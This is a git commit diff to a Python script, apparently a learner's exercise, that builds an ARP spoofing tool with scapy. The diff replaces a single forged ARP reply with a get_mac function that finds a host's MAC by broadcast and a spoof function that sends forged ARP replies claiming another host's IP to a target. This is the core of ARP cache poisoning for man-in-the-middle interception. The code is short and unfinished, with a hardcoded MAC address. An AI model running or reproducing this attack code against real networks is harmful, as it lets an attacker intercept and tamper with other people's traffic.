a305688b7da059d14700960e3c24051a4d4b3748
Maksym Lytvynchuk <lytvynchuk.official@gmail.com>
2019-08-04 06:04:35 -0400

    add getting mac func for arp spoof

--- arp_spoofing/arp_spoof.py
+++ arp_spoofing/arp_spoof.py
@@ -5,5 +5,19 @@ import scapy.all as scapy
 # psrc - our router ip
 # pdst - target ip
 # hwdst - target mac address
-packet = scapy.ARP(op=2, pdst="192.168.1.101", hwdst="f4:37:b7:d0:36:cd", psrc="192.168.1.1")
-scapy.send(packet)
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst = ip) # get an ip of our computer
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # get a mac address of our computer
+    arp_request_brodcast = broadcast/arp_request # arp_request + broadcast
+    answered_list = scapy.srp(arp_request_brodcast, timeout=1)[0]
+    mac_address = answered_list[0][1].hwsrc
+    return mac_address
+
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:9f:13:ae", psrc=spoof_ip)
+    scapy.send(packet)
+
+
